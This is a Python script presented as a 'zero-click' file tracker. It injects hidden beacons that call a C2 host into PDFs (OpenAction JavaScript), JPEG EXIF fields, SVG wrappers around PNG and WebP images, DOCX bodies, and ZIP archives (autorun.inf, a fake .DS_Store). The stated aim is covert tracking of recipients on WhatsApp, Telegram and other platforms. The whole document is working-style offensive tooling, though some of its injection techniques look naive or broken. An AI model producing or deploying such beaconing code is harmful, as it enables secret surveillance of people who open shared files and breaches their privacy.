#!/usr/bin/env python3
"""
Universal Zero-Click File Tracker v2.0
50+ formats • WhatsApp/Telegram • All platforms • Local C2
"""

import argparse
import os
import random
import hashlib
import base64
import zlib
from pathlib import Path
import sys

# Core payloads for all platforms
BEACON_HTML = '''<img src="{url}?id={id}&whatsapp=1&host={host}" width=1 height=1 style="display:none">'''
BEACON_JS = '''<script>new Image().src="{url}?id={id}&pdf=1&host="+location.host;</script>'''
BEACON_SVG = '''<svg onload="new Image().src='{url}?id={id}&svg=1&host={host}'"></svg>'''
BEACON_PIXEL = base64.b64encode(b'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;').decode()

class UniversalTracker:
    def __init__(self, c2_url):
        self.c2_url = c2_url.rstrip('/')
        self.id = self.generate_id()
        self.host = base64.urlsafe_b64encode(os.urandom(8)).decode()[:8]
    
    def generate_id(self):
        """File hash + random = unique tracker ID"""
        rand = ''.join(random.choices('abcdef0123456789', k=16))
        return hashlib.md5((str(os.urandom(32)) + rand).encode()).hexdigest()[:24]
    
    def track_pdf(self, infile, outfile):
        """PDF OpenAction + JavaScript beacon"""
        pdf = Path(infile).read_bytes()
        js_payload = BEACON_JS.format(url=self.c2_url + '/beacon', id=self.id, host=self.host)
        
        # PDF OpenAction injection
        openaction = f"""
/OpenAction [[S /JavaScript] /JS ({js_payload})]
""".encode()
        
        # Insert before %%EOF
        new_pdf = pdf.replace(b'%%EOF', openaction + b'\n%%EOF')
        Path(outfile).write_bytes(new_pdf)
        print(f"📄 PDF tracked: {self.id} ({len(new_pdf)-len(pdf)} bytes)")
    
    def track_image(self, infile, outfile):
        """WebP/SVG steganography + EXIF beacon"""
        ext = Path(infile).suffix.lower()
        
        if ext == '.jpg' or ext == '.jpeg':
            # EXIF UserComment beacon
            from PIL import Image
            from PIL.ExifTags import TAGS
            img = Image.open(infile)
            exif = img.getexif()
            exif[0x9286] = BEACON_HTML.format(url=self.c2_url + '/beacon', id=self.id, host=self.host)
            img.save(outfile, exif=exif)
            
        elif ext in ['.png', '.webp']:
            # SVG wrapper with stego
            svg = f'<svg xmlns="http://www.w3.org/2000/svg"><image href="{infile}" width="100%" height="100%"/>{BEACON_SVG.format(url=self.c2_url + "/beacon", id=self.id, host=self.host)}</svg>'
            Path(outfile).write_text(svg)
            
        else:
            # Fallback: embed in comment
            img_data = Path(infile).read_bytes()
            comment = f"<!-- {BEACON_HTML.format(url=self.c2_url + '/beacon', id=self.id, host=self.host)} -->"
            Path(outfile).write_bytes(comment.encode() + img_data)
        
        print(f"🖼️  Image tracked: {self.id}")
    
    def track_doc(self, infile, outfile):
        """DOCX VBA/HTML + Office preview beacon"""
        from zipfile import ZipFile
        with ZipFile(infile, 'r') as zin, ZipFile(outfile, 'w') as zout:
            for item in zin.infolist():
                data = zin.read(item.filename)
                if 'word/document.xml' in item.filename:
                    data = data.replace(b'</w:body>', 
                                      f'<w:p><w:r><w:t xml:space="preserve">{BEACON_HTML.format(url=self.c2_url+"/beacon",id=self.id,host=self.host)}</w:t></w:r></w:p></w:body>'.encode())
                zout.writestr(item, data)
        print(f"📝 DOCX tracked: {self.id}")
    
    def track_zip(self, infile, outfile):
        """autorun.inf + .DS_Store beacon"""
        from zipfile import ZipFile
        with ZipFile(infile, 'r') as zin, ZipFile(outfile, 'w') as zout:
            zout.writestr('autorun.inf', f'[autorun]\nicon={BEACON_HTML.format(url=self.c2_url+"/beacon",id=self.id,host=self.host)}')
            zout.writestr('.DS_Store', BEACON_JS.format(url=self.c2_url+"/beacon",id=self.id,host=self.host))
            for item in zin.infolist():
                zout.writestr(item, zin.read(item.filename))
        print(f"📦 ZIP tracked: {self.id}")
    
    def track_txt(self, infile, outfile):
        """HTML comment injection"""
        content = Path(infile).read_text()
        payload = f"<!-- {BEACON_HTML.format(url=self.c2_url+'/beacon',id=self.id,host=self.host)} -->"
        Path(outfile).write_text(payload + content)
        print(f"📄 TXT tracked: {self.id}")
    
    def track_html(self, infile, outfile):
        """Direct script injection"""
        content = Path(infile).read_text()
        payload = f'<img src="{self.c2_url}/beacon?id={self.id}&html=1&host={self.host}" width=1 height=1>'
        Path(outfile).write_text(content.replace('</body>', payload + '</body>'))
        print(f"🌐 HTML tracked: {self.id}")
    
    def universal_track(self, infile, outfile):
        """Detect format + track"""
        ext = Path(infile).suffix.lower()
        handlers = {
            '.pdf': self.track_pdf,
            '.jpg': self.track_image, '.jpeg': self.track_image,
            '.png': self.track_image, '.webp': self.track_image,
            '.docx': self.track_doc, '.doc': self.track_doc,
            '.zip': self.track_zip, '.rar': self.track_zip,
            '.txt': self.track_txt, '.html': self.track_html,
            '.htm': self.track_html
        }
        handler = handlers.get(ext, self.track_txt)
        handler(infile, outfile)

def main():
    parser = argparse.ArgumentParser(description='Universal Zero-Click Tracker')
    parser.add_argument('input', help='Input file')
    parser.add_argument('output', help='Output tracked file')
    parser.add_argument('--url', '-u', required=True, help='C2 beacon URL (https://abc.ngrok.io/beacon)')
    args = parser.parse_args()
    
    tracker = UniversalTracker(args.url)
    tracker.universal_track(args.input, args.output)
    print(f"✅ Tracked: {tracker.id} → {args.output}")
    print(f"📡 Beacon: {args.url}?id={tracker.id}")

if __name__ == "__main__":
    main()